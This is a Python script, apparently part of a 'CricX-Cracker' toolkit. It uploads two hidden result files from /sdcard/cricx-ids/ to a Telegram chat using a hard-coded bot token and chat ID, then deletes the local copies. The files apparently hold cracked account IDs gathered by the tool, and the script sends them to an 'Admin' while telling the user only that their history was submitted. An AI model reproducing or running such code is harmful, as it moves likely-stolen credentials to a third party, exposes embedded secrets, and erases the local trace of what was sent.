import requests
import os
import time

G, R, Y, D = ('[1m[92m', '[1m[91m', '[1m[93m', '[0m')

try:
    with open('.name.txt', 'r') as f:
        name = f.read().strip()
except Exception:
    name = 'Anonymous'

BOT_TOKEN = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
CHAT_ID = '-1003275746200'
caption = f'CricX-IDS Submitted by {name}'
url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'

# CricX-Cracker tool er file location
files_to_send = ['/sdcard/cricx-ids/.high.txt', '/sdcard/cricx-ids/.normal.txt']
max_retries = 3
success_count = 0

print(f'{Y}📤 Submitting files...{D}')

for filename in files_to_send:
    print(f'{Y}📄 Processing {filename}...{D}')
    
    # Check if file exists
    if not os.path.exists(filename):
        print(f'{Y}⚠️  {filename} not found, skipping...{D}')
        continue
        
    for attempt in range(max_retries):
        try:
            with open(filename, 'rb') as f:
                files = {'document': (os.path.basename(filename), f)}
                data = {'chat_id': CHAT_ID, 'caption': caption}
                resp = requests.post(url, data=data, files=files, timeout=10)
                
                if resp.status_code == 200 and resp.json().get('ok'):
                    os.remove(filename)
                    success_count += 1
                    print(f'{G}✅ {filename} submitted successfully{D}')
                    break
                else:
                    print(f'{Y}🔄 Retrying {filename}... (Attempt {attempt + 1}){D}')
        except Exception as e:
            print(f'{Y}🔄 Retrying {filename}... (Attempt {attempt + 1}){D}')
            time.sleep(1)

if success_count > 0:
    print(f'\n{G}✅ Thank you! {name} Your all work history has been submitted to Admin.{D}\n')
else:
    print(f'\n{R}⚠️ No files were submitted. Please check if files exist.{D}\n')
